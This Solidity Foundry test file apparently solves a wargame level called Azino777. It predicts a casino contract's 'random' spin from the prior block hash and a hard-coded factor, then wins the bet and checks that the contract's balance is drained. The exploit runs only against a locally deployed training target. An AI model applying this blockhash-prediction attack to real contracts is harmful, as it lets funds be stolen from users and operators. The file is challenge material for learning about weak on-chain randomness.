// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "../src/01_Azino777/Azino777.sol";

// forge test --match-contract Azino777Test -vvvv
contract Azino777Test is BaseTest {
    Azino777 instance;

    function setUp() public override {
        super.setUp();
        instance = new Azino777{value: 0.01 ether}();
        vm.deal(user1, 0.02 ether);
        vm.roll(43133);
    }

    function testExploitLevel() public {
        uint256 factor = (getFactor() * 100) / 100;
        uint256 hashVal = uint256(blockhash(43132));
        uint256 predictedNumber = uint256((uint256(hashVal) / factor)) % 100;

        console.log("Block hash:", hashVal);
        console.log("Predicted number:", predictedNumber);

        vm.prank(user1);
        instance.spin{value: 0.01 ether}(predictedNumber);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(
            address(instance).balance == 0,
            "Solution is not solving the level"
        );
    }

    function getFactor() public pure returns (uint256) {
        return
            1157920892373161954235709850086879078532699846656405640394575840079131296399;
    }
}
